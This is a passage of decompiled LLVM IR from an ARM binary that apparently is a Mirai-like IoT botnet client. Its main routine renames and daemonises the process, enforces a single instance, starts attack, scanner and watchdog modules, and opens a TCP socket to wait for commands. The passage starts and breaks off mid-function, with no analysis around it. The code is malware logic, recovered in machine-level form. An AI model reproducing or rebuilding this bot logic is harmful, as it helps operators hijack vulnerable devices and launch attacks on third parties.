  %v2_c31c = inttoptr i32 %v0_c314 to i32*
  %v3_c31c = call i32 @table_retrieve_val(i32 18, i32* %v2_c31c)
  %v3_c324 = call i32 @__libc_open(i32 %v3_c31c, i64* inttoptr (i32 2 to i64*))
  %v3_c328 = icmp eq i32 %v3_c324, -1
  store i32 %v3_c324, i32* @r4, align 4
  br i1 %v3_c328, label %dec_label_pc_c334, label %dec_label_pc_c2d8

dec_label_pc_c334:                                ; preds = %dec_label_pc_c314
  %v1_c338 = call i32 @table_lock_val(i32 17)
  %v1_c340 = call i32 @table_lock_val(i32 18)
  %v0_c344 = load i32, i32* @r5, align 4
  %v1_c348 = call i32 @__GI_exit(i32 %v0_c344)
  %v0_c34c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c34c, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_c334
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_c334, %bb15
  %v3_c34c = phi i32 [ %v1_c348, %dec_label_pc_c334 ], [ 0, %bb15 ]
  ret i32 %v3_c34c

; uselistorder directives
  uselistorder i32 %v3_c324, { 1, 2, 0 }
  uselistorder i32 %v3_c2c8, { 1, 2, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v0_c268, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_c360 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_c360, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_c378 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_c384 = call i32 @__GI_sigaddset(i32 %v2_c360, i32 2)
  %v0_c388 = load i32, i32* @r5, align 4
  store i32 %v0_c388, i32* %r2.global-to-local, align 4
  %v4_c394 = call i32 @__GI_sigprocmask(i32 %v0_c388, i32* nonnull %stack_var_-64, i32 %v0_c388)
  %v2_c3a0 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_c3ac = call i32 @bsd_signal(i32 5, i32 49324)
  %v0_c3b0 = call i32 @util_local_addr()
  store i16 -23551, i16* bitcast (i32* @global_var_23a32.73 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_23a2c.55 to i32), i32* %r3.global-to-local, align 4
  store i32 -583215265, i32* %r2.global-to-local, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 %v0_c3b0, i32* @global_var_23a2c.55, align 4
  store i32 -583215265, i32* @global_var_23a34.72, align 4
  store i16 2, i16* bitcast (i16** @global_var_23a30.70 to i16*), align 4
  %v5_c3e4 = call i32 @table_init(i32 %v0_c3b0, i32 ptrtoint (i16** @global_var_23a30.70 to i32), i32 -583215265, i32 ptrtoint (i32* @global_var_23a2c.55 to i32))
  store i32 ptrtoint (i32* @global_var_c0c4.66 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20da4.68 to i32), i32* @lr, align 4
  %v2_c3f0 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_c3f0, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_c0c4.66 to i32), i32* @global_var_20da4.68, align 4
  %v1_c3f8 = call i32 @ensure_single_instance(i32 %v5_c3e4)
  %v1_c3fc = call i32 @rand_init(i32 %v1_c3f8)
  %v2_c408 = call i32 @util_zero(i32 %v2_c3f0, i32 32)
  %v0_c40c = load i32, i32* @r6, align 4
  %v7_c40c = icmp eq i32 %v0_c40c, 2
  br i1 %v7_c40c, label %dec_label_pc_c538, label %dec_label_pc_c414

dec_label_pc_c414:                                ; preds = %dec_label_pc_c538, %entry, %dec_label_pc_c548
  %v0_c414 = call i32 @rand_next()
  store i32 %v0_c414, i32* @r6, align 4
  %v0_c41c = load i32, i32* @r8, align 4
  %v1_c41c = inttoptr i32 %v0_c41c to i32*
  %v2_c41c = load i32, i32* %v1_c41c, align 4
  %v1_c420 = inttoptr i32 %v2_c41c to i8*
  %v2_c420 = call i32 @util_strlen(i8* %v1_c420)
  %v0_c428 = load i32, i32* @r8, align 4
  %v1_c428 = inttoptr i32 %v0_c428 to i32*
  %v2_c428 = load i32, i32* %v1_c428, align 4
  %v1_c42c = inttoptr i32 %v2_c428 to i8*
  %v2_c42c = call i32 @util_strlen(i8* %v1_c42c)
  %v1_c430 = sub i32 20, %v2_c420
  %v0_c438 = load i32, i32* @r6, align 4
  %v3_c43c = urem i32 %v0_c438, %v1_c430
  %v2_c440 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_c440, i32* @r5, align 4
  %v2_c444 = add i32 %v3_c43c, %v2_c42c
  store i32 %v2_c444, i32* @r4, align 4
  %v2_c450 = call i32 @rand_alphastr(i32 %v2_c440, i32 %v2_c444)
  %v2_c454 = ptrtoint i32* %stack_var_-40 to i32
  %v1_c458 = load i32, i32* @r4, align 4
  %v2_c458 = add i32 %v1_c458, %v2_c454
  store i32 %v2_c458, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_c464 = load i32, i32* @r8, align 4
  %v1_c464 = inttoptr i32 %v0_c464 to i32*
  %v2_c464 = load i32, i32* %v1_c464, align 4
  store i32 %v2_c464, i32* @r0, align 4
  %v3_c468 = add i32 %v2_c458, -80
  %v4_c468 = inttoptr i32 %v3_c468 to i8*
  store i8 0, i8* %v4_c468, align 1
  %v2_c46c = inttoptr i32 %v2_c464 to i8*
  %v3_c46c = call i32 @util_strcpy(i8* %v2_c46c, i32 %v2_c440)
  %v2_c478 = call i32 @util_zero(i32 %v2_c440, i32 32)
  %v0_c47c = call i32 @rand_next()
  store i32 %v0_c47c, i32* @r7, align 4
  %v0_c484 = load i32, i32* @r8, align 4
  %v1_c484 = inttoptr i32 %v0_c484 to i32*
  %v2_c484 = load i32, i32* %v1_c484, align 4
  %v1_c488 = inttoptr i32 %v2_c484 to i8*
  %v2_c488 = call i32 @util_strlen(i8* %v1_c488)
  store i32 %v2_c488, i32* @r6, align 4
  %v0_c490 = load i32, i32* @r8, align 4
  %v1_c490 = inttoptr i32 %v0_c490 to i32*
  %v2_c490 = load i32, i32* %v1_c490, align 4
  %v1_c494 = inttoptr i32 %v2_c490 to i8*
  %v2_c494 = call i32 @util_strlen(i8* %v1_c494)
  %v0_c498 = load i32, i32* @r6, align 4
  %v1_c498 = sub i32 20, %v0_c498
  %v0_c4a0 = load i32, i32* @r7, align 4
  %v3_c4a4 = urem i32 %v0_c4a0, %v1_c498
  %v2_c4a8 = add i32 %v3_c4a4, %v2_c494
  store i32 %v2_c4a8, i32* @r4, align 4
  %v2_c4b4 = call i32 @rand_alphastr(i32 %v2_c440, i32 %v2_c4a8)
  store i32 %v2_c454, i32* %r2.global-to-local, align 4
  %v1_c4bc = load i32, i32* @r4, align 4
  %v2_c4bc = add i32 %v1_c4bc, %v2_c454
  store i32 %v2_c4bc, i32* %r3.global-to-local, align 4
  %v0_c4c0 = load i32, i32* @sl, align 4
  %v1_c4c0 = trunc i32 %v0_c4c0 to i8
  %v3_c4c0 = add i32 %v2_c4bc, -80
  %v4_c4c0 = inttoptr i32 %v3_c4c0 to i8*
  store i8 %v1_c4c0, i8* %v4_c4c0, align 1
  %v4_c4cc = call i32 @prctl(i32 15, i32 %v2_c440, i32 %v2_c454, i32 %v2_c4bc)
  %v1_c4d4 = call i32 @table_unlock_val(i32 3)
  %v3_c4e4 = call i32 @table_retrieve_val(i32 3, i32* nonnull %stack_var_-48)
  %v3_c4e8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c4e8, i32* @r2, align 4
  %v2_c4f4 = call i32 @__GI___libc_write(i32 1, i32 %v3_c4e4)
  store i32 1, i32* @r2, align 4
  %v2_c504 = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_180f4.87 to i32))
  %v1_c50c = call i32 @table_lock_val(i32 3)
  %v1_c510 = call i32 @attack_init(i32 %v1_c50c)
  %v1_c514 = call i32 @watchdog_maintain(i32 %v1_c510)
  %v0_c518 = call i32 @__libc_fork()
  %v1_c51c = load i32, i32* @sl, align 4
  %v7_c520 = icmp sgt i32 %v0_c518, %v1_c51c
  br i1 %v7_c520, label %dec_label_pc_c524, label %dec_label_pc_c570

dec_label_pc_c524:                                ; preds = %dec_label_pc_c414
  ret i32 %v1_c51c

dec_label_pc_c538:                                ; preds = %entry
  %v0_c538 = load i32, i32* @r8, align 4
  %v1_c538 = add i32 %v0_c538, 4
  %v2_c538 = inttoptr i32 %v1_c538 to i32*
  %v3_c538 = load i32, i32* %v2_c538, align 4
  %v1_c53c = inttoptr i32 %v3_c538 to i8*
  %v2_c53c = call i32 @util_strlen(i8* %v1_c53c)
  %v8_c544 = icmp sgt i32 %v2_c53c, 31
  br i1 %v8_c544, label %dec_label_pc_c414, label %dec_label_pc_c548

dec_label_pc_c548:                                ; preds = %dec_label_pc_c538
  %v0_c548 = load i32, i32* @r8, align 4
  %v1_c548 = add i32 %v0_c548, 4
  %v2_c548 = inttoptr i32 %v1_c548 to i32*
  %v3_c548 = load i32, i32* %v2_c548, align 4
  store i32 %v2_c3f0, i32* @r0, align 4
  %v2_c550 = bitcast i32* %stack_var_-152 to i8*
  %v3_c550 = call i32 @util_strcpy(i8* %v2_c550, i32 %v3_c548)
  %v0_c554 = load i32, i32* @r8, align 4
  %v1_c554 = add i32 %v0_c554, 4
  %v2_c554 = inttoptr i32 %v1_c554 to i32*
  %v3_c554 = load i32, i32* %v2_c554, align 4
  %v1_c55c = inttoptr i32 %v3_c554 to i8*
  %v2_c55c = call i32 @util_strlen(i8* %v1_c55c)
  %v2_c568 = call i32 @util_zero(i32 %v3_c554, i32 %v2_c55c)
  br label %dec_label_pc_c414

dec_label_pc_c570:                                ; preds = %dec_label_pc_c414
  %v1_c570 = call i32 @__GI_setsid(i32 %v0_c518)
  %v0_c578 = load i32, i32* @sl, align 4
  %v1_c57c = call i32 @__GI___libc_close(i32 %v0_c578)
  %v1_c584 = call i32 @__GI___libc_close(i32 1)
  %v1_c58c = call i32 @__GI___libc_close(i32 2)
  store i32 ptrtoint (i32* @global_var_20da0.89 to i32), i32* @fp, align 4
  %v1_c594 = call i32 @attack_init(i32 %v1_c58c)
  %v1_c598 = call i32 @watchdog_maintain(i32 %v1_c594)
  %v1_c59c = call i32 @scanner_init(i32 %v1_c598)
  %v0_c5a0 = load i32, i32* @sl, align 4
  %v2_c5a4 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_c5a4, i32* @r7, align 4
  %v2_c5a8 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_c5a8, i32* @r6, align 4
  %v2_c688 = ptrtoint i32* %stack_var_-72 to i32
  %v2_c6d8 = ptrtoint i32* %stack_var_-168 to i32
  %v2_c8b4 = ptrtoint i32* %stack_var_-56 to i32
  %v2_c8bc = ptrtoint i8** %stack_var_-42 to i32
  %v2_ca60 = ptrtoint i32* %stack_var_-1432 to i32
  %v2_c8d8 = ptrtoint i32* %stack_var_-52 to i32
  %v1_c988 = bitcast i32* %stack_var_-152 to i8*
  %v2_c94c = ptrtoint i32* %stack_var_-88 to i32
  %v1_c964 = sub i32 0, %v1_c570
  br label %dec_label_pc_c5ac

dec_label_pc_c5ac:                                ; preds = %dec_label_pc_c9e8, %dec_label_pc_ca84, %bb44, %dec_label_pc_c984, %dec_label_pc_c7bc, %dec_label_pc_c7ac, %bb41, %dec_label_pc_cad8, %dec_label_pc_ca44, %dec_label_pc_c9f8, %dec_label_pc_c9d4, %dec_label_pc_c904, %dec_label_pc_c82c, %dec_label_pc_c764, %dec_label_pc_c570
  %stack_var_-1436.0 = phi i32 [ %v0_c5a0, %dec_label_pc_c570 ], [ %stack_var_-1436.0, %bb41 ], [ %stack_var_-1436.1, %dec_label_pc_c7ac ], [ %stack_var_-1436.1, %dec_label_pc_c7bc ], [ %stack_var_-1436.1, %bb44 ], [ %stack_var_-1436.1, %dec_label_pc_c9f8 ], [ %stack_var_-1436.1, %dec_label_pc_c82c ], [ %stack_var_-1436.1, %dec_label_pc_ca84 ], [ %stack_var_-1436.1, %dec_label_pc_cad8 ], [ %stack_var_-1436.1, %dec_label_pc_ca44 ], [ %stack_var_-1436.1, %dec_label_pc_c764 ], [ %stack_var_-1436.1, %dec_label_pc_c984 ], [ %stack_var_-1436.1, %dec_label_pc_c9d4 ], [ %stack_var_-1436.1, %dec_label_pc_c904 ], [ %stack_var_-1436.1, %dec_label_pc_c9e8 ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c5b8

dec_label_pc_c5b8:                                ; preds = %dec_label_pc_c5b8, %dec_label_pc_c5ac
  %v1_c5bc = phi i32 [ %v1_c5c0, %dec_label_pc_c5b8 ], [ 4, %dec_label_pc_c5ac ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c5bc = load i32, i32* @r7, align 4
  %v3_c5bc = add i32 %v2_c5bc, %v1_c5bc
  %v4_c5bc = inttoptr i32 %v3_c5bc to i32*
  store i32 0, i32* %v4_c5bc, align 4
  %v0_c5c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5c0 = add i32 %v0_c5c0, 4
  store i32 %v1_c5c0, i32* %r3.global-to-local, align 4
  %v7_c5c4 = icmp eq i32 %v1_c5c0, 128
  br i1 %v7_c5c4, label %dec_label_pc_c5cc, label %dec_label_pc_c5b8

dec_label_pc_c5cc:                                ; preds = %dec_label_pc_c5b8
  %v0_c5cc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_c5cc, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c5d4

dec_label_pc_c5d4:                                ; preds = %dec_label_pc_c5d4, %dec_label_pc_c5cc
  %v1_c5d8 = phi i32 [ %v1_c5dc, %dec_label_pc_c5d4 ], [ 4, %dec_label_pc_c5cc ]
  store i32 0, i32* @r4, align 4
  %v2_c5d8 = load i32, i32* @r6, align 4
  %v3_c5d8 = add i32 %v2_c5d8, %v1_c5d8
  %v4_c5d8 = inttoptr i32 %v3_c5d8 to i32*
  store i32 0, i32* %v4_c5d8, align 4
  %v0_c5dc = load i32, i32* %r3.global-to-local, align 4
  %v1_c5dc = add i32 %v0_c5dc, 4
  store i32 %v1_c5dc, i32* %r3.global-to-local, align 4
  %v7_c5e0 = icmp eq i32 %v1_c5dc, 128
  br i1 %v7_c5e0, label %dec_label_pc_c5e8, label %dec_label_pc_c5d4

dec_label_pc_c5e8:                                ; preds = %dec_label_pc_c5d4
  store i32 ptrtoint (i32* @global_var_20d9c.75 to i32), i32* %r3.global-to-local, align 4
  %v2_c5ec = load i32, i32* @global_var_20d9c.75, align 4
  %v7_c5f0 = icmp eq i32 %v2_c5ec, -1
  br i1 %v7_c5f0, label %dec_label_pc_c61c, label %dec_label_pc_c5f8

dec_label_pc_c5f8:                                ; preds = %dec_label_pc_c5e8
  %v3_c5f8 = udiv i32 %v2_c5ec, 32
  %v3_c5fc = mul nuw nsw i32 %v3_c5f8, 4
  store i32 %v2_c454, i32* %ip.global-to-local, align 4
  %v2_c604 = add i32 %v3_c5fc, %v2_c454
  store i32 %v2_c604, i32* %r3.global-to-local, align 4
  %v1_c608 = add i32 %v2_c604, -240
  %v2_c608 = inttoptr i32 %v1_c608 to i32*
  %v3_c608 = load i32, i32* %v2_c608, align 4
  %v1_c60c = urem i32 %v2_c5ec, 32
  %v7_c614 = shl i32 1, %v1_c60c
  %v8_c614 = or i32 %v3_c608, %v7_c614
  store i32 %v8_c614, i32* %r2.global-to-local, align 4
  store i32 %v8_c614, i32* %v2_c608, align 4
  br label %dec_label_pc_c61c

dec_label_pc_c61c:                                ; preds = %dec_label_pc_c5e8, %dec_label_pc_c5f8
  %v2_c61c = load i32, i32* @global_var_20da0.89, align 4
  store i32 %v2_c61c, i32* @r3, align 4
  %v7_c620 = icmp eq i32 %v2_c61c, -1
  store i32 ptrtoint (i32* @global_var_20da0.89 to i32), i32* @r8, align 4
  br i1 %v7_c620, label %dec_label_pc_c844, label %dec_label_pc_c62c

dec_label_pc_c62c:                                ; preds = %dec_label_pc_c844, %dec_label_pc_c61c, %bb43
  %v2_c630 = load i8, i8* bitcast (i8** @global_var_20f1c.92 to i8*), align 4
  %v2_c634 = icmp eq i8 %v2_c630, 0
  %v2_c780 = load i32, i32* @global_var_20da0.89, align 4
  store i32 %v2_c780, i32* %ip.global-to-local, align 4
  %v3_c784 = udiv i32 %v2_c780, 32
  store i32 %v3_c784, i32* %r3.global-to-local, align 4
  br i1 %v2_c634, label %dec_label_pc_c780, label %dec_label_pc_c63c

dec_label_pc_c63c:                                ; preds = %dec_label_pc_c62c
  %v3_c648 = mul nuw nsw i32 %v3_c784, 4
  %v2_c64c = add i32 %v3_c648, %v2_c454
  store i32 %v2_c64c, i32* %r3.global-to-local, align 4
  %v1_c650 = add i32 %v2_c64c, -368
  %v2_c650 = inttoptr i32 %v1_c650 to i32*
  %v3_c650 = load i32, i32* %v2_c650, align 4
  %v1_c654 = urem i32 %v2_c780, 32
  %v7_c65c = shl i32 1, %v1_c654
  %v8_c65c = or i32 %v3_c650, %v7_c65c
  store i32 %v8_c65c, i32* %r2.global-to-local, align 4
  store i32 %v8_c65c, i32* %v2_c650, align 4
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %dec_label_pc_c780, %dec_label_pc_c63c
  store i32 ptrtoint (i32* @global_var_20d9c.75 to i32), i32* %r3.global-to-local, align 4
  %v2_c668 = load i32, i32* @global_var_20d9c.75, align 4
  store i32 0, i32* @lr, align 4
  %v0_c670 = load i32, i32* %ip.global-to-local, align 4
  %v5_c674 = icmp slt i32 %v0_c670, %v2_c668
  br i1 %v5_c674, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_c664
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_c664, %bb
  %v0_c684 = phi i32 [ %v2_c668, %dec_label_pc_c664 ], [ %v0_c670, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_c684 = add i32 %v0_c684, 1
  store i32 %v2_c688, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c5a8, i32* %r2.global-to-local, align 4
  %v5_c6a0 = call i32 @__libc_select(i32 %v1_c684, i32 %v2_c5a4, i32 %v2_c5a8, i32 0, i32 %v2_c688)
  %v8_c6a4 = icmp eq i32 %v5_c6a0, -1
  br i1 %v8_c6a4, label %dec_label_pc_c5ac, label %dec_label_pc_c6ac

dec_label_pc_c6ac:                                ; preds = %bb41
  %v6_c6a0 = trunc i32 %v5_c6a0 to i16
  %v3_c6ac = icmp eq i16 %v6_c6a0, 0
  br i1 %v3_c6ac, label %dec_label_pc_c6b4, label %dec_label_pc_c6e8

dec_label_pc_c6b4:                                ; preds = %dec_label_pc_c6ac
  %v5_c6c0 = srem i32 %stack_var_-1436.0, 6
  %v4_c6c8 = sub i32 %stack_var_-1436.0, %v5_c6c0
  store i32 %v4_c6c8, i32* %r3.global-to-local, align 4
  %v2_c6d0 = icmp eq i32 %v5_c6c0, 0
  %v1_c6d4 = add i32 %stack_var_-1436.0, 1
  store i32 %v1_c6d4, i32* @lr, align 4
  store i32 %v2_c6d8, i32* %r2.global-to-local, align 4
  %v7_c6dc = inttoptr i32 %v5_c6a0 to i8*
  store i8* %v7_c6dc, i8** %stack_var_-42, align 4
  br i1 %v2_c6d0, label %dec_label_pc_c8b4, label %dec_label_pc_c6e8

dec_label_pc_c6e8:                                ; preds = %dec_label_pc_c6ac, %dec_label_pc_c6b4, %dec_label_pc_c8b4
  %stack_var_-1436.1 = phi i32 [ %v1_c6d4, %dec_label_pc_c8b4 ], [ %v1_c6d4, %dec_label_pc_c6b4 ], [ %stack_var_-1436.0, %dec_label_pc_c6ac ]
  store i32 ptrtoint (i32* @global_var_20d9c.75 to i32), i32* %r3.global-to-local, align 4
  %v2_c6ec = load i32, i32* @global_var_20d9c.75, align 4
  %v7_c6f0 = icmp eq i32 %v2_c6ec, -1
  br i1 %v7_c6f0, label %dec_label_pc_c71c, label %dec_label_pc_c6f8

dec_label_pc_c6f8:                                ; preds = %dec_label_pc_c6e8
  %v3_c6f8 = udiv i32 %v2_c6ec, 32
  %v3_c6fc = mul nuw nsw i32 %v3_c6f8, 4
  store i32 %v2_c454, i32* %ip.global-to-local, align 4
  %v2_c704 = add i32 %v3_c6fc, %v2_c454
  store i32 %v2_c704, i32* %r3.global-to-local, align 4
  %v1_c708 = add i32 %v2_c704, -240
  %v2_c708 = inttoptr i32 %v1_c708 to i32*
  %v3_c708 = load i32, i32* %v2_c708, align 4
  %v1_c70c = urem i32 %v2_c6ec, 32
  %v6_c710 = ashr i32 %v3_c708, %v1_c70c
  store i32 %v6_c710, i32* %r2.global-to-local, align 4
  %v1_c714 = urem i32 %v6_c710, 2
  %v2_c714 = icmp eq i32 %v1_c714, 0
  br i1 %v2_c714, label %dec_label_pc_c71c, label %dec_label_pc_c940

dec_label_pc_c71c:                                ; preds = %dec_label_pc_c6f8, %dec_label_pc_c6e8
  %v2_c720 = load i8, i8* bitcast (i8** @global_var_20f1c.92 to i8*), align 4
  %v3_c720 = zext i8 %v2_c720 to i32
  store i32 %v3_c720, i32* @r4, align 4
  %v2_c724 = icmp eq i8 %v2_c720, 0
  %v2_c7ac = load i32, i32* @global_var_20da0.89, align 4
  br i1 %v2_c724, label %dec_label_pc_c7ac, label %dec_label_pc_c72c

dec_label_pc_c72c:                                ; preds = %dec_label_pc_c71c
  %v3_c730 = udiv i32 %v2_c7ac, 32
  store i32 %v2_c454, i32* %r2.global-to-local, align 4
  %v3_c738 = mul nuw nsw i32 %v3_c730, 4
  %v2_c73c = add i32 %v3_c738, %v2_c454
  store i32 %v2_c73c, i32* %r3.global-to-local, align 4
  %v1_c740 = add i32 %v2_c73c, -368
  %v2_c740 = inttoptr i32 %v1_c740 to i32*
  %v3_c740 = load i32, i32* %v2_c740, align 4
  %v1_c744 = urem i32 %v2_c7ac, 32
  %v6_c748 = ashr i32 %v3_c740, %v1_c744
  store i32 %v6_c748, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_20f1c.92 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_c754 = urem i32 %v6_c748, 2
  %v2_c754 = icmp eq i32 %v1_c754, 0
  store i8 0, i8* bitcast (i8** @global_var_20f1c.92 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_20da0.89 to i32), i32* @r5, align 4
  br i1 %v2_c754, label %dec_label_pc_c764, label %dec_label_pc_c8d0

dec_label_pc_c764:                                ; preds = %dec_label_pc_c72c
  store i32 51052, i32* @lr, align 4
  %v1_c768 = icmp ne i32 %v2_c7ac, -1
  call void @__pseudo_cond_branch(i1 %v1_c768, i32 ptrtoint (i32* @global_var_12d80.94 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_c770 = load i32, i32* @r5, align 4
  %v2_c770 = inttoptr i32 %v1_c770 to i32*
  store i32 -1, i32* %v2_c770, align 4
  %v1_c778 = call i32 @sleep(i32 1)
  br label %dec_label_pc_c5ac

dec_label_pc_c780:                                ; preds = %dec_label_pc_c62c
  store i32 %v2_c454, i32* %r2.global-to-local, align 4
  %v3_c78c = mul nuw nsw i32 %v3_c784, 4
  %v2_c790 = add i32 %v3_c78c, %v2_c454
  store i32 %v2_c790, i32* %r3.global-to-local, align 4
  %v1_c794 = add i32 %v2_c790, -240
  %v2_c794 = inttoptr i32 %v1_c794 to i32*
  %v3_c794 = load i32, i32* %v2_c794, align 4
  %v1_c798 = urem i32 %v2_c780, 32
  %v7_c7a0 = shl i32 1, %v1_c798
  %v8_c7a0 = or i32 %v3_c794, %v7_c7a0
  store i32 %v8_c7a0, i32* %r2.global-to-local, align 4
  store i32 %v8_c7a0, i32* %v2_c794, align 4
  br label %dec_label_pc_c664

dec_label_pc_c7ac:                                ; preds = %dec_label_pc_c71c
  %v7_c7b0 = icmp eq i32 %v2_c7ac, -1
  store i32 ptrtoint (i32* @global_var_20da0.89 to i32), i32* @r8, align 4
  br i1 %v7_c7b0, label %dec_label_pc_c5ac, label %dec_label_pc_c7bc

dec_label_pc_c7bc:                                ; preds = %dec_label_pc_c7ac
  %v3_c7bc = udiv i32 %v2_c7ac, 32
  store i32 %v2_c454, i32* %r2.global-to-local, align 4
  %v3_c7c4 = mul nuw nsw i32 %v3_c7bc, 4
  %v2_c7c8 = add i32 %v3_c7c4, %v2_c454
  store i32 %v2_c7c8, i32* %r3.global-to-local, align 4
  %v1_c7cc = add i32 %v2_c7c8, -240
  %v2_c7cc = inttoptr i32 %v1_c7cc to i32*
  %v3_c7cc = load i32, i32* %v2_c7cc, align 4
  %v1_c7d0 = urem i32 %v2_c7ac, 32
  %v6_c7d4 = ashr i32 %v3_c7cc, %v1_c7d0
  store i32 %v6_c7d4, i32* %r2.global-to-local, align 4
  %v1_c7d8 = urem i32 %v6_c7d4, 2
  %v2_c7d8 = icmp eq i32 %v1_c7d8, 0
  br i1 %v2_c7d8, label %dec_label_pc_c5ac, label %dec_label_pc_c7e0

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c7bc
  %v6_c7e4 = inttoptr i32 %v3_c720 to i8*
  store i8* %v6_c7e4, i8** %stack_var_-42, align 4
  store i32 %v2_c8bc, i32* @sl, align 4
  %v0_c7e8 = call i32 @__GI___errno_location()
  %v0_c7ec = load i32, i32* @r4, align 4
  %v2_c7ec = inttoptr i32 %v0_c7e8 to i32*
  store i32 %v0_c7ec, i32* %v2_c7ec, align 4
  store i32 %v0_c7e8, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_c7fc = load i32, i32* @global_var_20da0.89, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_c808 = call i32 @__libc_recv(i32 %v2_c7fc, i32 %v2_c8bc, i32 2, i32 16386)
  %v7_c80c = icmp eq i32 %v4_c808, -1
  br i1 %v7_c80c, label %dec_label_pc_c9e8, label %dec_label_pc_c814

dec_label_pc_c814:                                ; preds = %dec_label_pc_c7e0
  %v2_c814 = icmp eq i32 %v4_c808, 0
  br i1 %v2_c814, label %dec_label_pc_c9f8, label %dec_label_pc_c81c

dec_label_pc_c81c:                                ; preds = %dec_label_pc_c814
  store i32 %v2_c6d8, i32* %ip.global-to-local, align 4
  %v3_c820 = load i8*, i8** %stack_var_-42, align 4
  %v4_c820 = ptrtoint i8* %v3_c820 to i32
  store i32 %v4_c820, i32* %r3.global-to-local, align 4
  %v2_c824 = icmp eq i8* %v3_c820, null
  br i1 %v2_c824, label %dec_label_pc_c82c, label %dec_label_pc_ca28

dec_label_pc_c82c:                                ; preds = %dec_label_pc_c81c
  %v2_c82c = load i32, i32* @global_var_20da0.89, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_c838 = add i32 %v4_c820, 16384
  store i32 %v1_c838, i32* %r3.global-to-local, align 4
  %v4_c83c = call i32 @__libc_recv(i32 %v2_c82c, i32 %v2_c8bc, i32 2, i32 %v1_c838)
  br label %dec_label_pc_c5ac

dec_label_pc_c844:                                ; preds = %dec_label_pc_c61c
  %v0_c84c = load i32, i32* @r4, align 4
  store i32 %v0_c84c, i32* %r2.global-to-local, align 4
  %v3_c850 = call i32 @socket(i32 2, i32 1, i32 %v0_c84c)
  %v7_c854 = icmp eq i32 %v3_c850, -1
  store i32 %v3_c850, i32* @r5, align 4
  %v1_c85c = load i32, i32* @r8, align 4
  %v2_c85c = inttoptr i32 %v1_c85c to i32*
  store i32 %v3_c850, i32* %v2_c85c, align 4
  br i1 %v7_c854, label %dec_label_pc_c62c, label %dec_label_pc_c864

dec_label_pc_c864:                                ; preds = %dec_label_pc_c844
  %v0_c864 = load i32, i32* @r4, align 4
  store i32 %v0_c864, i32* @r2, align 4
  %v2_c86c = call i32 @__libc_fcntl(i32 %v3_c850, i32 3)
  %v1_c874 = or i32 %v2_c86c, 2048
  store i32 %v1_c874, i32* @r2, align 4
  %v0_c878 = load i32, i32* @r5, align 4
  %v2_c87c = call i32 @__libc_fcntl(i32 %v0_c878, i32 4)
  %v2_c884 = load i32, i32* @global_var_20da4.68, align 4
  store i32 %v2_c884, i32* %r3.global-to-local, align 4
  %v2_c888 = icmp eq i32 %v2_c884, 0
  br i1 %v2_c888, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_c864
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_c864, %bb42
  %v2_c890 = xor i1 %v2_c888, true
  call void @__pseudo_cond_branch(i1 %v2_c890, i32 ptrtoint (i32* @global_var_fa28.95 to i32))
  store i32 ptrtoint (i8** @global_var_20f1c.92 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
